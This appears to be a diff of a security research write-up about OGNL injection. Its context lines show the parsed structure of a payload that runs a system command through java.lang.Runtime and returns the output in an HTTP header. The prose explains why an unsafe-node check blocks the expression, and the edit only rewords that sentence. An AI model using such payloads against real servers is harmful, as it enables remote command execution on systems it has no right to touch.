@@ -124,5 +124,6 @@ ASTAssign: #a = @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRu
 ASTStaticMethod: @com.opensymphony.webwork.ServletActionContext@getResponse()
 ASTMethod: setHeader("X-Cmd-Response", #a)
 ```
-Now we know why it doesn't work, because `ASTAssign` is in `UNSAFE_NODE_TYPES` so `containsUnsafeExpression` return true and we cannot get our expression evaluated 
+Now you can guess why it doesn't work, because `ASTAssign` is in `UNSAFE_NODE_TYPES` so `containsUnsafeExpression` return true and we cannot get our expression evaluated 
+
 
